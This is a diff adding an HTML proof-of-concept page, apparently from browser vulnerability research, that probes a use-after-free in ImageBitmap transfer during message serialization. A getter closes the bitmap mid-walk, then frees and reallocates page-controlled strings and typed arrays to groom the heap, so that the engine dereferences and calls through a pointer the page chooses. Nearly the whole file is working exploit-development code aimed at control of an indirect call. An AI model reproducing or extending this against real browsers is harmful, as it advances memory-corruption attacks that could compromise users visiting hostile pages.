@@ -1,0 +1,104 @@
+<!doctype html>
+<meta charset=utf-8>
+<title>caps19 — can the page select the element's m_data8 block?</title>
+<!--
+  docs/103. The slot is docs/94's: a transferred ImageBitmap closed inside the walk leaves a disengaged
+  std::optional<ImageBitmapBacking> (32 B), and readTransferredImageBitmap reads its byte 8 as a
+  SerializedImageBuffer* and calls through it (ImageBuffer.cpp:119).
+
+  docs/94 §4 measured that with quiet=1 the slot holds the m_data8/m_data16 field of a freed StringImpl,
+  i.e. a heap pointer to characters, and the engine's 8-byte load there is an ASAN heap-buffer-overflow.
+  This page asks the next question: can the page put ITS OWN StringImpl (or its characters) in that slot, so
+  that the 8 bytes at the character pointer are page-chosen?
+
+  Single arm "md8"; one variable per run:
+    sk=none        getter only closes the bitmap (the docs/94 quiet baseline)
+    sk=title       document.title = <s>; document.title = '';      (frees a page StringImpl, class 32)
+    sk=css         el.style.setProperty('--z', <s>); removeProperty (same, through CSSOM)
+    u=<hex4>       first UTF-16 unit of <s>; units 1..7 are 0     -> word = u, little endian
+    reuse=<n>      after the free, allocate a Uint8Array(cls) and keep it alive
+    cls=<bytes>    that array's length (default 16)
+    pre=1          create+free <s> BEFORE the walk; the getter is inert (the placement control)
+  No beacon is sent after the getter: a beacon is itself a host-string free and would take the slot
+  (docs/94's beacon arm). The pre-beacon names the arm, so a crash still names its input.
+-->
+<body>
+<canvas id="c" width="8" height="8"></canvas>
+<script>
+"use strict";
+const Q = new URLSearchParams(location.search);
+const ARM = Q.get('arm') || 'md8';
+const SK = Q.get('sk') || 'none';
+const U = parseInt(Q.get('u') || '1000', 16) & 0xffff;
+const REUSE = +(Q.get('reuse') || 0);
+const CLS = +(Q.get('cls') || 16);
+const PRE = Q.get('pre') === '1';
+const TMO = +(Q.get('tmo') || 4000);
+const DELAY = +(Q.get('delay') || 0);   // parks the page so a gdb attach lands before the walk
+function ev(m) { new Image().src = '/ev?m=' + encodeURIComponent(m); }
+
+const cv = document.getElementById('c');
+const cx = cv.getContext('2d', { willReadFrequently: true });
+cx.fillStyle = '#ff0000'; cx.fillRect(0, 0, 8, 8);
+
+// 8 UTF-16 units: [u,0,0,0,0,0,0,0] -> the first 8 bytes of the character data are `u`, little endian.
+function payload() {
+    let s = String.fromCharCode(U);
+    for (let i = 1; i < 8; i++) s += String.fromCharCode(0);
+    return s;
+}
+let KEEP = null;                       // keeps the reuse allocation alive
+function makeAndFreeStr() {
+    const s = payload();
+    if (SK === 'title') { document.title = s; document.title = ''; }
+    else if (SK === 'css') { cv.style.setProperty('--z', s); cv.style.removeProperty('--z'); }
+}
+function reuseAlloc() {
+    const a = new Uint8Array(CLS);
+    a.fill(0);
+    a[0] = U & 0xff; a[1] = (U >>> 8) & 0xff;   // the word we want the engine to read at the char pointer
+    KEEP = a;
+}
+function onePortMsg(value, transfer) {
+    return new Promise((resolve) => {
+        const ch = new MessageChannel();
+        let settled = false;
+        const done = (o) => { if (!settled) { settled = true; resolve(o); } };
+        ch.port1.onmessage = (e) => done({ ok: 1, data: e.data });
+        ch.port1.onmessageerror = () => done({ ok: 0, tag: 'messageerror' });
+        let posted = 0, name = '', message = '';
+        try { ch.port2.postMessage(value, transfer || []); posted = 1; }
+        catch (e) { name = e.name; message = String(e.message).slice(0, 80); }
+        if (!posted) { done({ ok: 0, tag: 'threw', name, message }); return; }
+        setTimeout(() => done({ ok: 0, tag: 'timeout' }), TMO);
+    });
+}
+function desc(v) {
+    if (v === null) return 'null';
+    if (v === undefined) return 'undef';
+    const t = typeof v;
+    if (t !== 'object') return t + ':' + String(v).slice(0, 20);
+    return (v.constructor && v.constructor.name) + ':w' + v.width + 'h' + v.height;
+}
+
+async function main() {
+    ev('cap&arm=' + ARM + '&sk=' + SK + '&u=' + U.toString(16) + '&reuse=' + REUSE + '&cls=' + CLS + '&pre=' + (PRE ? 1 : 0));
+    if (ARM !== 'md8') { ev('badarm'); return ev('done&arm=' + ARM); }
+
+    const b = await createImageBitmap(cv);
+    if (PRE) makeAndFreeStr();          // placement control: same allocation, outside the walk
+    if (DELAY) await new Promise(r => setTimeout(r, DELAY));
+    const g = { get z() {
+        b.close();
+        if (!PRE && SK !== 'none') makeAndFreeStr();
+        if (!PRE && REUSE) reuseAlloc();
+        return 1;
+    } };
+    const msg = { pad: 'x'.repeat(200), k: b, g: g };
+    const r = await onePortMsg(msg, [b]);
+    ev('xmid&ok=' + r.ok + '&tag=' + r.tag + '&name=' + (r.name || '') + '&m=' + encodeURIComponent(r.message || ''));
+    if (r.ok) ev('rx&d=' + desc(r.data.k) + '&w=' + (r.data.k ? r.data.k.width : -1) + '&h=' + (r.data.k ? r.data.k.height : -1));
+    ev('done&arm=' + ARM + '&sk=' + SK);
+}
+main().catch(e => ev('err&e=' + encodeURIComponent(String(e && e.name) + ':' + String(e && e.message).slice(0, 120))));
+</script>
